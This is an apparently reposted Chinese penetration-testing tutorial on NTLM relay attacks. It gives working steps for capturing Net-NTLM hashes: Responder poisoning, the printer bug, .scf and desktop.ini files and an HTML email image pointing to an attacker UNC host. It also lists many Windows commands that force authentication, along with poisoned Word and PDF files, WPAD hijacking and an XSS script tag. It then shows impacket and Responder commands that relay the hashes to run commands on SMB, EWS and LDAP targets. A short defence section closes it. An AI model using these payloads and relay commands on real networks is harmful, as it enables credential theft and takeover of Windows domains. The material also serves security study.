**目录**

[NTLM Relay](#t0 "NTLM Relay")

[捕获Net-NTLM Hash](#t1 "捕获Net-NTLM Hash")

[NBNS&LLMNR](#t2 "NBNS&LLMNR")

[打印机漏洞](#t3 "打印机漏洞")

[图标](#t4 "图标")

[Outlook](#t5 "Outlook")

[系统命令](#t6 "系统命令")

[office](#t7 "office")

[pdf](#t8 "pdf")

[WPAD](#t9 "WPAD")

[XSS](#t10 "XSS")

[XXE&SSRF](#t11 "XXE&SSRF")

[重放Net-NTLM Hash](#t12 "重放Net-NTLM Hash")

[Relay To SMB](#t13 "Relay To SMB")

[Relay To EWS](#t14 "Relay To EWS")

[Relay To LDAP](#t15 "Relay To LDAP")

[NTLM Relay的防御](#t16 "NTLM Relay的防御")

* * *

NTLM Relay
==========

NTLM Relay其实严格意义上并不能叫NTLM Relay，而是应该叫 Net-NTLM Relay。它是发生在NTLM认证的第三步，在 Type3 Response消息中存在Net-NTLM [Hash](https://so.csdn.net/so/search?q=Hash&spm=1001.2101.3001.7020)，当攻击者获得了Net-NTLM Hash后，可以进行中间人攻击，重放Net-NTLM Hash，这种攻击手法也就是大家所说的**NTLM Relay(NTLM 中继)**攻击。

进行NTLM Relay攻击有两步：

*   第一步是捕获Net-NTLM Hash
*   第二步是重放Net-NTLM Hash

捕获Net-NTLM Hash
---------------

捕获Net-NTLM Hash又有两步：

*   第一步是需要使目标服务器向攻击者发起NTLM请求
*   第二步是使用工具来捕获服务器发来的NTLM请求

那么如何能使目标服务器向攻击者发起NTLM请求呢？思路是让受害者自己把Net-NTLM Hash发送给攻击者，也就是说只要是使用SMB、HTTP、LDAP、MSSQL等协议来进行NTLM认证的程序，都可以尝试用来向攻击者发送Net-NTLM Hash。比如浏览器、office word文档、pdf文档、explorer等。如果新发现一个这类应用程序，或者发现这些程序的一种调用方法，就会多出一种攻击手段。几种常见的获取方法如下：

### NBNS&LLMNR

NBNS 和 LLMNR 是Microsoft针对工作组和域设计的名称解析协议，主要用于局域网中的名称解析。当DNS解析失败时，Windows系统会使用 NetBIOS 和 LLMNR 搜索名称。这些协议只为本地连接设计。NetBIOS 和LLMNR在WindowsVista以后的系统中均实现，二者的主要区别在于：

*   NetBIOS基于广播，而LLMNR基于多播；
*   NetBIOS在WindowsNT以后的所有操作系统上均可用，而只有WindowsVista和更高版本才支持LLMNR；

*   LLMNR还支持IPv6，而NetBIOS不支持，因此，在启用了IPv6，但对IPv6管理不如IPv4那样细致的复杂网络中，就可能发生更广泛的攻击

**LLMNR**

LLMNR(Link-LocalMulticast NameResolution)：链路本地多播名称解析(LLMNR)，是一个基于协议域名系统(DNS)数据包的格式。使得两者的IPv4和IPv6的主机进行名称解析为同一本地链路上的主机，因此也称作多播 DNS。监听的端口为UDP/5355，支持IPv4和IPv6。当主机访问另外一台主机时，如果只知道对方的主机名，则会向局域网内多播请求，询问该主机名对应的ip地址，然后收到该请求的主机首先会判断自己的主机名是否是这个，如果是的话，则会回复一个ip地址，如果主机名不符合，则丢弃。LLMNR协议就类似于ARP协议。其解析名称的特点为端到端，IPv4 的广播地址为 224.0.0.252，IPv6 的广播地址为 FF02:0:0:0:0:0:1:3 或 FF02::1:3。

![](https://img-blog.csdnimg.cn/img_convert/dbc2bb5d47f832dc3eedc14d69afcbb5.png)**NBNS**

Netbios(Network Basic Input Output System)：网络基本输入输出系统，NetBIOS协议是由IBM公司开发，主要用于20-200台计算机的局域网。NBNS通过UDP137端口进行通信，仅支持IPV4不支持IPV6。NBNS是一种应用程序接口(API)，系统可以利用WINS服务、广播及Lmhost文件等多种模式将NetBIOS名解析为相应IP地址，几乎所有的局域网都是在NetBIOS协议的基础上工作的。在Windows操作系统中，默认情况下在安装 TCP/IP 协议后会自动安装NetBIOS。NetBIOS 协议进行名称解析的过程如下：

*   检查本地 NetBIOS 缓存
*   如果缓存中没有请求的名称且已配置了 WINS 服务器，接下来则会向 WINS 服务器发出请求

*   如果没有配置 WINS 服务器或 WINS 服务器无响应则会向当前子网域发送广播
*   如果发送广播后无任何主机响应则会读取本地的 lmhosts 文件

![](https://img-blog.csdnimg.cn/img_convert/4e74b6ef2bb4626e67d1bca204812e1f.png)

Windows系统的名称解析顺序如下：

*   本地hosts文件（%windir%\\System32\\drivers\\etc\\hosts）
*   DNS缓存/DNS服务器

*   链路本地多播名称解析（LLMNR）和NetBIOS名称服务（NBTNS）

因此只要用户输入一个不能解析的名称，由于本地hosts文件和DNS均不能正常解析该名称。于是会发送LLMNR/NBT-NS数据包请求解析，攻击者收到请求后告诉客户端它是该名称并要求客户端发送Net-NTLMHash进行认证，于是攻击者就可以收到客户端发来的Net-NTLMHash了。

![](https://img-blog.csdnimg.cn/img_convert/c0d102c944b279211b7102386df60269.png)

```
responder -I eth0 -rPv
```


![](https://img-blog.csdnimg.cn/img_convert/d85b413aa5ac7e7e2098cc2390c6cd1d.png)

![](https://img-blog.csdnimg.cn/img_convert/15089c221f7c32d3cbdbe24ccb76db97.png)

![](https://img-blog.csdnimg.cn/img_convert/4042e1acf9ae8cc67f665e9c3ba5bc96.png)

### **打印机漏洞**

Windows的MS-RPRN协议用于打印客户机和打印服务器之间的通信，默认情况下是启用的。协议定义的RpcRemoteFindFirstPrinterChangeNotificationEx() 调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。任何经过身份验证的域成员都可以连接到远程服务器的打印服务（spoolsv.exe），并请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。之后它会将立即测试该连接，即向指定目标进行身份验证（攻击者可以选择通过Kerberos或NTLM进行验证）。微软表示这个bug是系统设计特点，无需修复。由于打印机是以system权限运行的，所以我们访问打印机RPC，迫使打印机服务向我们发起请求，我们就能拿到目标机器用户的Net-NTLM Hash。

如下，我们执行printerbug.py脚本，使用域内任意用户访问目标机器的打印机服务，此脚本会触发SpoolService Bug，强制Windows主机通过MS-RPRNRPC接口向攻击者进行身份验证。因此我们能收到目标机器向我们发送Net-NTLMHash。在后面我们会讲到利用这个漏洞进行接管域控。

![](https://img-blog.csdnimg.cn/img_convert/5363b8de7911f6d74e45f0bbe50b0918.png)

![](https://img-blog.csdnimg.cn/img_convert/864ca3518650a212ab822023d7e0bb14.png)

### 图标

当图标的一些路径属性改成我们的UNC路径的话，我们就能收到目标服务器发来的NTLM请求。

**desktop.ini**

在每个文件夹底下都有一个隐藏文件desktop.ini，其作用是指定文件夹的图标之类。可以通过修改文件夹属性——>隐藏受保护的操作系统文件(推荐) ，来显示desktop.ini文件。

创建一个test文件夹，然后修改该文件夹的图标为任何其他

![](https://img-blog.csdnimg.cn/img_convert/fb9493f7e7686f981f531d031c9d314a.png)

然后修改该文件夹的 隐藏受保护的操作系统文件(推荐) 属性，取消勾选

![](https://img-blog.csdnimg.cn/img_convert/4d865eade813107d2ab928c34f40df0b.png)

接着就能在test文件夹下看到desktop.ini文件了

![](https://img-blog.csdnimg.cn/img_convert/2309628c0e1d6bd141c734e89e3c16ca.png)

编辑desktop.ini文件

![](https://img-blog.csdnimg.cn/img_convert/ea1d4edc5b6b093b6f79f7342e2962dd.png)

将IconResource替换为攻击者的UNC路径

![](https://img-blog.csdnimg.cn/img_convert/9a7b1abdd7f4b8d1c3ccad38da3466a9.png)

只要有人访问了test文件夹，目标主机就会去请求指定UNC的图标资源，于是该主机会将当前用户的Net-NTLM Hash发送给指定的机器，我们在该机器上使用Responder监听，就能接收到目标机器发来的Net-NTLM Hash了。

![](https://img-blog.csdnimg.cn/img_convert/c4f6955e7c347b214e20ec0bc081285f.png)

**用户头像**

该功能适用于Windows 10、Windows Server 2016/2019。在更改账户图片处，输入指定的UNC路径

![](https://img-blog.csdnimg.cn/img_convert/805f5756c41182c657ebf30e7f582f1b.png)

我们就能抓到目标机器的当前用户的Net-NTLM Hash了。

![](https://img-blog.csdnimg.cn/img_convert/3b38d0d90eab0303f792d8c2ac127a9e.png)

如果是在域内，用普通用户的权限指定一个webadv地址的图片，如果普通用户验证图片通过，那么system用户(域内是机器用户)也会去访问172.16.100.180，并且携带凭据，我们就可以拿到机器用户的Net-NTLM Hash，这个可以用来提权

**scf文件**

只要一个文件夹内含有scf后缀的文件，由于scf文件包含了IconFile属性，所以explore.exe会尝试获取文件夹的图标。而IconFile是支持UNC路径的，所以当打开文件夹的时候，目标主机就会去请求指定UNC的图标资源，于是该主机会将当前用户的NTLM v2 hash发送给指定的机器，我们在该机器上使用Responder监听，就能接收到目标机器发来的Net-NTLM Hash了。以下是scf后缀的文件的格式：

```
[Shell]      
Command=2      
IconFile=UNC路径      
[Taskbar]      
Command=ToggleDesktop
```


创建一个test文件夹，在该文件夹内创建test.scf文件，文件内容如下：

```
[Shell]      
Command=2      
IconFile=\\192.168.106.5\test\test.ico      
[Taskbar]      
Command=ToggleDesktop
```


![](https://img-blog.csdnimg.cn/img_convert/422faaabb4c852b442973c1206683c55.png)

只要有人访问了test文件夹，目标主机就会去请求指定UNC的图标资源，于是该主机会将当前用户的NTLM v2 hash发送给指定的机器，我们在该机器上使用Responder监听，就能接收到目标机器发来的Net-NTLM Hash了。

![](https://img-blog.csdnimg.cn/img_convert/2cbf90e0713af76bc7290de1b6e65927.png)

### Outlook

邮件是支持发送HTML格式邮件的。于是我们可以发送带有如下html payload的邮件：

```
<p>邮件发送测试...</p>      
<img src="\\\\192.168.106.5\\test">
```


![](https://img-blog.csdnimg.cn/img_convert/19a40a3e7eb1f7bb224818da8dd66453.png)

当目标使用的是Windows机器，并且使用的是Outlook客户端打开该邮件的话，我们就能收到目标机器的Net-NTLM Hash。

![](https://img-blog.csdnimg.cn/img_convert/dab34e8b6350db0edaed6d81241a7f82.png)

![](https://img-blog.csdnimg.cn/img_convert/07452ba6c3a2258accd852fa2c7518e4.png)

### 系统命令

通过执行系统命令，访问指定的UNC路径，来获取目标机器的Net-NTLM Hash。

```
net.exe use \hostshare       
attrib.exe \hostshare      
cacls.exe \hostshare      
certreq.exe \hostshare #(noisy, pops an error dialog)       
certutil.exe \hostshare      
cipher.exe \hostshare      
ClipUp.exe -l \hostshare      
cmdl32.exe \hostshare      
cmstp.exe /s \hostshare      1
colorcpl.exe \hostshare #(noisy, pops an error dialog)      1
comp.exe /N=0 \hostshare \hostshare      1
compact.exe \hostshare      1
control.exe \hostshare      1
convertvhd.exe -source \hostshare -destination \hostshare      1
Defrag.exe \hostshare      1
diskperf.exe \hostshare      1
dispdiag.exe -out \hostshare      1
doskey.exe /MACROFILE=\hostshare      1
esentutl.exe /k \hostshare      2
expand.exe \hostshare      2
extrac32.exe \hostshare      2
FileHistory.exe \hostshare #(noisy, pops a gui)      2
findstr.exe * \hostshare      2
fontview.exe \hostshare #(noisy, pops an error dialog)      2
fvenotify.exe \hostshare #(noisy, pops an access denied error)      2
FXSCOVER.exe \hostshare #(noisy, pops GUI)      2
hwrcomp.exe -check \hostshare      2
hwrreg.exe \hostshare      2
icacls.exe \hostshare       3
licensingdiag.exe -cab \hostshare      3
lodctr.exe \hostshare      3
lpksetup.exe /p \hostshare /s      3
makecab.exe \hostshare      3
msiexec.exe /update \hostshare /quiet      3
msinfo32.exe \hostshare #(noisy, pops a "cannot open" dialog)      3
mspaint.exe \hostshare #(noisy, invalid path to png error)      3
msra.exe /openfile \hostshare #(noisy, error)      3
mstsc.exe \hostshare #(noisy, error)      3
netcfg.exe -l \hostshare -c p -i foo
```


![](https://img-blog.csdnimg.cn/img_convert/2366dd65af5e92834a49a1bb73cd27ca.png)

![](https://img-blog.csdnimg.cn/img_convert/72ee703684691f75fd365bbfd25ec060.png)

### office

新建一个word文件，插入一张图片

![](https://img-blog.csdnimg.cn/img_convert/739af8af3aefa277340e353610cfb1ec.png)

用压缩软件打开，进入 test.docx\\word\\\_rels 目录，修改document.xml.rels文件

![](https://img-blog.csdnimg.cn/img_convert/2bbf28ef3794f6aee3b6c59d0192f35a.png)

可以看到Target参数是本地的路径，我们修改为指定的UNC路径，然后加上TargetMode="External"

![](https://img-blog.csdnimg.cn/img_convert/d3c885885b5093f32978286b811a445b.png)

![](https://img-blog.csdnimg.cn/img_convert/3d9fd61750d0105fb3f468bf9b05b68f.png)

只要有人访问了该word文档，目标主机就会去请求指定UNC的图片资源，于是该主机会将当前用户的NTLM v2 hash发送给指定的机器，我们在该机器上使用Responder监听，就能接收到目标机器发来的Net-NTLM Hash了。

![](https://img-blog.csdnimg.cn/img_convert/42991ef82d23e28ce4401d2b6b941aa0.png)

![](https://img-blog.csdnimg.cn/img_convert/e91eb593106870da9c971fdf65d525ef.png)

### pdf

PDF文件可以添加一项功能：请求远程SMB服务器的文件。于是乎，利用PDF文件的正常功能够窃取Windows系统的Net-NTLM Hash。当用户使用PDF阅读器打开一份恶意的PDF文档，该PDF会向远程SMB服务器发出请求，如果该远程SMB服务器对数据包进行抓取，就能够获得用户Windows系统的Net-NTLM Hash。

如下，使用脚本往正常的PDF文件中加入请求远程SMB服务器的功能，生成 test.pdf.malicious.pdf 文件。

```
python2 WorsePDF.py test.pdf 192.168.106.5
```


![](https://img-blog.csdnimg.cn/img_convert/08aa6a2e91f7b8293fd38d2dc1f51def.png)

经过测试发现，只有使用Adobe PDF阅读器才会发收到Net-NTLM Hash，Chrome、Edge和WPS的PDF阅读器不能收到Net-NTLM Hash。

![](https://img-blog.csdnimg.cn/img_convert/95e02a484d6c4f25959651d05666db9b.png)

### WPAD

WPAD(Web Proxy Auto-Discovery Protocol) Web代理自动发现协议是用来查找PAC(Proxy Auto-Config)文件的协议，其主要通过DHCP、DNS、LLMNR、NBNS协议来查找存放PAC文件的主机。PAC文件定义了浏览器和其他用户代理如何自动选择适当的代理服务器来访问一个URL，通俗点说就是PAC文件中配置了代理服务器，用户在访问网页时，首先会查询PAC文件的位置，然后获取PAC文件，将PAC文件作为代理配置文件。

浏览器查询PAC文件的顺序如下：

1.  通过DHCP服务器
2.  查询WPAD主机的IP

*   Hosts
*   DNS (cache / server)

*   LLMNR
*   NBNS 

PAC文件的格式如下：

```
function FindProxyForURL(url, host) {      
   if (url== 'http://www.baidu.com/') return 'DIRECT';      
   if (host== 'twitter.com') return 'SOCKS 127.0.0.10:7070';      
   if (dnsResolve(host) == '10.0.0.100') return 'PROXY 127.0.0.1:8086;DIRECT';      
   return 'DIRECT';      
}
```


WPAD的一般请求流程如下(图片来源乌云drop)，WPAD涉及到两种攻击方式。

![](https://img-blog.csdnimg.cn/img_convert/754a0d44afcd9e99b6d143dbeab0fb5a.png)

![](https://img-blog.csdnimg.cn/img_convert/f18ebcf2bc1280a77b28694d6dd45a34.png)

**配合LLMNR/NBNS投毒**

一个典型的劫持方式是利用LLMNR/NBNS欺骗来让受害者从攻击者获取PAC文件，PAC文件指定攻击者就是代理服务器，然后攻击者就可以劫持受害者的HTTP流量，在其中插入任意HTML标签。

![](https://img-blog.csdnimg.cn/img_convert/96a8572cdafd6614324b9c5aedfba30e.png)

![](https://img-blog.csdnimg.cn/img_convert/9bea7f7d43e5c1eb9ade6999c0b0755e.png)

IE浏览器默认是自动检测设置

![](https://img-blog.csdnimg.cn/img_convert/01e13e04bd959f5220cac4553798600e.png)

1.  用户在访问网页时，由于IE浏览器默认是自动检测设置，所以首先会查询PAC文件的位置，查询的地址是WPAD/wpad.dat。如果本地hosts文件和DNS服务器解析不到这个域名的话，就会使用LLMNR发起广播包询问WPAD对应的ip是多少。
2.  受害者通过LLMNR询问WPAD主机的ip，Responder通过LLMNR投毒将WPAD的ip指向Responder所在的服务器

1.  受害者访问 /wpad.dat(Responder此时就能获得目标机器的Net-NTLM Hash，但是这个Responder默认不开，因为害怕会有登录提醒，不利于后面的中间人攻击，可以加上-F开启)，然后Responder通过伪造如下PAC文件将代理指向 proxysrv:3141
2.  受害者会使用proxysrv:3141作为代理，但是受害者不知道proxysrv对应的ip是什么，所以会再次查询，Responder再次通过LLMNR投毒进行欺骗。将LLMNR指向Responder本身，然后开始中间人攻击，攻击者可以劫持受害者的HTTP流量，在其中插入任意HTML标签(插入XSS Payload获取Net-NTLM Hash)或者获取cookie等其他数据。

```
responder -I eth0 -rPvw
```


![](https://img-blog.csdnimg.cn/img_convert/e295d7790e8f641c4c1826f7ff408275.png)

然而，微软在2016年发布了MS16-077安全公告，添加了两个重要的保护措施，以缓解这类攻击行为：

*   系统再也无法通过广播协议来解析WPAD文件的位置，只能通过使用DHCP或DNS协议完成该任务。
*   更改了PAC文件下载的默认行为，以便当WinHTTP请求PAC文件时，不会自动发送客户端的凭据来响应NTLM或协商身份验证质询。

**配合DHCPv6**

如果目标主机打上了MS16-077补丁的话，就无法通过LLMNR/NBNS欺骗来指定PAC文件了。目标机器只可以通过DHCP和DNS协议来获取PAC文件。但是DHCP和DNS都有指定的服务器，并且大部分情况下DHCP服务器和DNS服务器我们是不可控的，没法进行投毒，这时候我们就需要用到IPV6了。从Windows Vista以来，所有的Windows系统（包括服务器版系统）都会启用IPv6网络，并且优先级要高于IPv4网络。这里我们要用到DHCPV6协议。在DHCPv6协议中，客户端通过向组播地址发送Solicit报文来定位DHCPv6服务器，组播地址\[ff02::1:2\]包括整个地址链路范围内的所有DHCPv6服务器和中继代理。

DHCPv6四步交互过程如下：

1.  客户端向\[ff02::1:2\]组播地址发送一个Solicit请求报文
2.  DHCP服务器或中继代理回应Advertise消息告知客户端

1.  客户端选择优先级最高的服务器并发送Request信息请求分配地址或其他配置信息
2.  最后服务器回复包含确认地址，委托前缀和配置（如可用的DNS或NTP服务器）的Relay消息

通俗点来说就是，在可以使用IPV6的情况下(Windows Vista以后默认开启)，攻击者能接收到其他机器的DHCPv6组播包，攻击者通过攻击可以让受害者的IPv6 DNS设置为攻击者的IPv6地址。

### XSS

当我们能进行[xss](https://so.csdn.net/so/search?q=xss&spm=1001.2101.3001.7020)的时候，可以在网页中插入指定的UNC路径，来获取目标机器的Net-NTLM Hash。

```
<!doctype html>      
<html lang="en">      
<head>      
  <meta charset="UTF-8">      
</head>      
<body>      
</body>      
    <script src="\\192.168.106.5\test"></script>      
</html>
```


![](https://img-blog.csdnimg.cn/img_convert/c6c55c49272b792903a8bf6cf7a6750c.png)

### XXE&SSRF

如果目标网站存在XXE或者SSRF漏洞的话，可以尝试访问指定的UNC(\\\\ip\\x或file://ip/x)路径或者指定的HTTP(http://ip/x)路径，看能否接收到Net-NTLM Hash。各个语言触发XXE和SSRF的实现不同，同一门语言也有不同的触发方式，这里就不一一讲了，因为我对各种语言也不熟悉。

重放Net-NTLM Hash
---------------

在获取到了目标机器的Net-NTLM Hash后，我们要怎么利用呢？这里有两种利用方式：

1.  使用Hashcat破解Net-NTLM Hash
2.  Relay Net-NTLM Hash

本文主要讲如何Relay Net-NTLM Hash。我们知道，由于NTLM只是底层的认证协议，必须镶嵌在上层应用协议里面，消息的传输依赖于使用NTLM的上层协议，比如SMB、HTTP、LDAP等。因此，我们可以将获取到的Net-NTLM Hash Relay到其他使用NTLM进行认证的应用上。

### Relay To SMB

直接Relay到SMB服务器，是最直接简单的方法。可以直接控制该服务器执行任意命令等操作。

这里根据工作组和域环境，有两种场景：

1.  工作组环境：在工作组环境中，工作组中的机器之间相互没有信任关系，除非两台机器的账号密码相同，否则Relay不成功。但是如果账号密码相同的话，为何不直接Pass The Hash攻击呢？因此在工作组环境下，Relay到其他机器不太现实。那么，我们可以Relay到机器自身吗？答案是可以的。但是后来微软在MS08-068补丁中对Relay到自身机器做了限制，严禁Relay到机器自身。道高一尺魔高一丈，这个补丁在CVE-2019-1384(Ghost Potato)被攻击者绕过了。
2.  域环境：在域环境中，默认普通域用户可以登录除域控外的其他所有机器(但是为了安全，企业运维人员通常会限制域用户登录的主机)，因此可以将Net-NTLM Hash Relay到域内的其他机器。如果是拿到了域控机器的Net-NTLM Hash，可以Relay到除域控外的其他所有机器(为啥不Relay到其他域控，因为域内只有域控默认开启SMB签名)。

**工作组**

**Relay To Self(MS08-068)**

当拿到用户的SMB请求之后，最直接的就是把请求Relay回本身，即Reflect。从而控制机子本身。漏洞危害特别高，该漏洞编号为MS08-068。微软在KB957097补丁里面通过修改SMB身份验证答复的验证方式来防止凭据重播，从而解决了该漏洞。防止凭据重播的做法如下:

1.  在Type 1阶段，主机A访问主机B进行SMB认证的时候，将 _pszTargetName_ 设置为CIFS/B
2.  在Type 2阶段，主机A拿到主机B发送的Challenge挑战值之后，在lsass进程里面缓存(Challenge,CIFS/B)

1.  在Type 3阶段，主机B在拿到主机A的认证消息之后，会去查询lsass进程里面有没有缓存(Challenge,CIFS/B)，如果存在缓存，那么认证失败。

因为如果主机A和主机B是不同主机的话，那么lsass进程里面就不会缓存(Challenge,CIFS/B)。如果是同一台主机的话，那lsass里面就会缓存(Challenge,CIFS/B)，这个时候就会认证失败。

![](https://img-blog.csdnimg.cn/img_convert/b5d6ae05f15d26369eb435ee03bfe9b5.png)

**Ghost Potato(CVE-2019-1384)**

这个漏洞绕过了KB957097补丁里面限制不能Relay回本机的限制。由于在KB957097补丁措施里面这个缓存(Challenge,CIFS/B)是有时效性的，这个时间是300秒，也就是说300秒后，缓存(Challenge,cifs/B)就会被清空，这个时候即使主机A和主机B是同一台主机，那么由于缓存已经被清除，那么lsass进程里面肯定没有(Challenge,CIFS/B)缓存。

shenaniganslabs 放出了漏洞利用poc，基于impacket进行修改，目前只能支持收到http协议请求的情况。该poc在sleep 315秒之后，再发送Type 3认证消息，于是就绕过了KB957097补丁。详情：[Ghost Potato | Shenanigans Labs](https://shenaniganslabs.io/2019/11/12/Ghost-Potato.html "Ghost Potato | Shenanigans Labs")

该poc实现的效果是在目标机器的启动目录上传指定的文件

```
python ntlmrelayx.py -t smb://10.211.55.7 -smb2support --gpotato-startup test.txt
```


![](https://img-blog.csdnimg.cn/img_convert/f6746574ab041026bd456e5e2514115f.png)

![](https://img-blog.csdnimg.cn/img_convert/bbea11ccb2510a40803e061880fe96c4.png)

**域环境**

**impacket下的smbrelayx.py**

```
./smbrelayx.py -h 10.211.55.7 -c whoami
```


![](https://img-blog.csdnimg.cn/img_convert/c938aa300499b99c8cd2f70c17188f28.png)

**impacket下的ntlmrelayx.py**

```
./ntlmrelayx.py -t smb://10.211.55.7 -c whoami -smb2support
```


![](https://img-blog.csdnimg.cn/img_convert/b0b8a911387205ec9b8d4d9f6248492f.png)

**Responder下的MultiRelay.py脚本**

该脚本功能强大，通过ALL参数可以获得一个稳定的shell，还有抓密码等其他功能。

![](https://img-blog.csdnimg.cn/img_convert/37a4670717b179442e195b355935cb12.png)

参看有哪些命令

![](https://img-blog.csdnimg.cn/img_convert/a6c77894e2de9264675dd305252f6a56.png)

执行系统命令

![](https://img-blog.csdnimg.cn/img_convert/2d394069685b720583e5d611c6ba5bf3.png)

抓取内存中的密码

![](https://img-blog.csdnimg.cn/img_convert/eddb796118d89709d303c5e660cf125b.png)

### **Relay To EWS**

Exchange认证也支持NTLM SSP的。于是我们可以将SMB流量Relay到Exchange的EWS接口，从而可以进行收发邮件等操作，还可以通过Homepage下发规则达到命令执行的效果。关于Relay To EWS详细利用，我会在后期文章中讲解，主要是使用ntlmRelayToEWS.py脚本。

**收发邮件**

```
python2 ntlmRelayToEWS.py -t https://10.211.55.5/EWS/exchange.asmx -r getFolder -f inbox -v
```


![](https://img-blog.csdnimg.cn/img_convert/f7fbb97af4618560d74c8d2b31a85b24.png)

![](https://img-blog.csdnimg.cn/img_convert/5b1c6430daba6115f577ae8d903a5891.png)

### Relay To LDAP

LDAP服务器默认就是域控，LDAP的默认策略是协商签名，而并不是强制签名。也就是说是否签名是由客户端决定的。服务端跟客户端协商是否需要签名，不同的协议要求的不同：

*   从HTTP协议Relay到LDAP是不要求进行签名的，可以直接进行Relay，如CVE-2018-8581。
*   从SMB协议Relay到LDAP是要求进行签名的，这时，并不能直接进行Relay。CVE-2019-1040就是绕过了NTLM的MIC消息完整性校验，使得SMB协议Relay到LDAP时不需要签名，从而可以发动攻击。

我们现在就讨论可以Relay到LDAP后有哪些攻击方式：

1.  利用基于资源的约束性委派进行权限提升
2.  Write Dcsync ACL Dump域内哈希

这两种利用方式我会在后面的文章中阐述原理和细节，本文就不细讲了。

NTLM Relay的防御
-------------

*   SMB & LDAP 签名：默认只有域控是开启了SMB签名，而LDAP签名默认策略是协商签名，也就是说是否签名是由客户端决定的。服务端跟客户端协商是否签名。(客户端如果是SMB协议的话，默认要求签名的，如果是webadv或者http协议，是不要求签名的)，微软于 2019-09-11 日发布相关通告称微软计划于 2020 年 1 月发布安全更新。为了提升域控制器的安全性，该安全更新将强制开启所有域控制器上 LDAP channel binding 与 LDAP signing 功能。

*   EAP (Enhanced Protection Authentication)：NTLM 认证和一个安全通道进行绑定，在 NTLM 认证过程中，最后的 NTLM 认证数据报文包含一个目标应用服务器的证书摘要，这个摘要使用客户端的 NTLM 值进行签名保护，可以防止伪造证书的攻击。

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

参考：[NTLM 基础 介绍 - windows protocol](https://daiker.gitbook.io/windows-protocol/ntlm-pian/4 "NTLM 基础 介绍 - windows  protocol")

            [https://www.freebuf.com/column/202842.html](https://www.freebuf.com/column/202842.html "            https://www.freebuf.com/column/202842.html")